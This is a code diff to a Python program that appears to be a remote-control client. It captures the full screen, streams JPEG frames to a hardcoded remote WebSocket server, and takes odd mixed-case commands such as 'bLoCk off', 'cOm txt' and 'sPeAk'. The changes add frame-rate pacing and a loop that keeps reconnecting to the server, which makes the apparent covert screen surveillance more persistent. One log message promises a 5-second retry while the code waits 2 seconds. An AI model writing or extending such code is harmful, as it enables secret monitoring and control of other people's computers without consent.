@@ -468,29 +468,32 @@ async def receive_messages(websocket):
 
 async def send_screen(websocket):
     global sharing
+    target_fps = 30
     with mss() as sct:
         monitor = sct.monitors[1]
         frame_count = 0
         start_time = time()
 
-        while sharing:
+        while sharing:  
+            frame_start_time = time()  
+
             img = sct.grab(monitor)
             img_pil = frombytes("RGB", img.size, img.rgb)
 
-            img_pil = img_pil.resize((960, 540)) 
+            img_pil = img_pil.resize((960, 540))  
 
             buf = io.BytesIO()
-            img_pil.save(buf, format='JPEG', quality=50)  
+            img_pil.save(buf, format='JPEG', quality=50) 
             jpeg_bytes = buf.getvalue()
             timestamp = int(time() * 1000)
             timestamp_bytes = struct.pack(">Q", timestamp)
             packet = timestamp_bytes + jpeg_bytes
 
             try:
-                await websocket.send(packet) 
+                await websocket.send(packet)  
             except Exception as e:
                 print(f"[SEND ERROR] {e}")
-                break
+                break 
 
             frame_count += 1
             elapsed = time() - start_time
@@ -499,22 +502,42 @@ async def send_screen(websocket):
                 frame_count = 0
                 start_time = time()
 
-            await asyncio.sleep(0.05)
+            frame_processing_time = time() - frame_start_time
+
+            target_frame_time = 1.0 / target_fps 
+            remaining_time = target_frame_time - frame_processing_time 
+
+            if remaining_time > 0:
+                await asyncio.sleep(remaining_time)
+
+        await websocket.close()
+        print("[INFO] WebSocket connection closed.")
 
 async def screenshare():
     uri = "wss://screenshare-server.onrender.com"
-    try:
-        async with websockets.connect(uri, max_size=None) as websocket:
-            await websocket.send("sender")
-            print("[INFO] Connected to server as sender")
 
-            await asyncio.gather(
-                send_screen(websocket),
-                receive_messages(websocket)
-            )
+    while sharing:
+        try:
+            async with websockets.connect(uri, max_size=None) as websocket:
+                await websocket.send("sender")
+                print("[INFO] Connected to server as sender")
 
-    except Exception as e:
-        print(f"[ERROR] {e}")
+                await asyncio.gather(
+                    send_screen(websocket),
+                    receive_messages(websocket)
+                )
+
+        except (websockets.exceptions.ConnectionClosedError,
+                websockets.exceptions.InvalidHandshake,
+                asyncio.TimeoutError,
+                OSError) as e:
+            print(f"[WARNING] Connection failed: {e}. Reconnecting in 5 seconds...")
+            await asyncio.sleep(2)
+
+        except Exception as e:
+            print(f"[ERROR] Unexpected error: {e}")
+            break 
+
 def share_trig():
     asyncio.run(screenshare())
 
@@ -584,6 +607,7 @@ def main():
                 Thread(target=block_main).start()
             elif "bLoCk off" in cmd:
                 bmstate = False
+                bsig = False
             elif "cOm txt" in cmd:
                 Thread(target=commtxt).start()
             elif "sPeAk" in cmd:
